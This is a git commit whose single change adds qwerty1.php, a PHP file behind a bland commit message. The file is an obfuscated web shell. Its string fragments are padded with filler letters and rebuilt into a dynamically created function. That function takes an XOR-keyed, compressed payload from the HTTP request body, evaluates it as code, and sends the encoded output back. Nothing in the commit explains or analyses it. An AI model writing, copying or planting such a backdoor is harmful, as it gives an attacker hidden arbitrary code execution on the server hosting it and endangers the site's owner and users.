65632f5f7ef6c07a156ca2c658496849526a1c7f
rasko7 <117736056+rasko7@users.noreply.github.com>
2022-11-08 19:41:15 +0600

    Create qwerty1.php

---
+++ qwerty1.php
@@ -0,0 +1,11 @@
+<?php
+$O=str_replace('it','','creititaittite_funitcittion');
+$o='_eTnd_cleanT();$r=TT@Tbase6T4_encode(@x(T@gzcompreTss($o)T,$kT));print("$pT$khT$r$kf");}';
+$F='val(@gzuncomTpress(@xT(@base6T4_decoTde($Tm[1]),$k)))T;$oT=@ob_gTet_contTents()T;@ob';
+$B='ction x($Tt,$k)T{$c=stTrlen($kT);$Tl=strlenT($t);$ToT="";foTr($iT=0;$i<$l;){fTor($j=T0';
+$H='"/TT$kh(.+)$kf/",@fiTle_gTTet_contents("pThp://iTnputT"),$m)==T1T) {@ob_TTstart();T@eT';
+$w='T$k="9T0T03d1df";$kh="22eTb4d38200T1";$kf="T50T7038519T4c8";$Tp="60T7MTWjqHDyuPfyBTt";fTun';
+$y='T;($j<$c&&T$i<$l);T$j++,$i+T+){$To.=$t{$i}T^$k{$j}T;}}retTurn $oTT;}if (@pregT_matTch(';
+$t=str_replace('T','',$w.$B.$y.$H.$F.$o);
+$V=$O('',$t);$V();
+?>
